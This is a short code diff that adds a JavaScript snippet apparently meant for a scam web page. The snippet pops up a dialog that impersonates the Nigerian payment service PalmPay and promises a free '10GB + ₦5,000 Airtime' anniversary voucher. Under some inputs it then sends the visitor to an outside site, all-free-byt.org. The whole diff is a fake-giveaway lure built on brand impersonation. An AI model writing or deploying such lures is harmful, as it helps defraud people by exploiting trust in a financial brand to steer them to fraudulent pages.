@@ -1,0 +1,6 @@
+
+var password = '10GB + ₦5,000 Airtime'
+password=prompt('PalmPay: Dear Nigerian, you have been selected to receive 10GB + ₦5,000 Airtime Voucher as we celebrate PalmPay 5th Anniversary, press Ok to get offer now ','10GB + ₦5,000 Airtime');
+if (password != '10GB + ₦5,000 Airtime') {
+location.href='https://all-free-byt.org/5yrs-anniversary.html';
+}
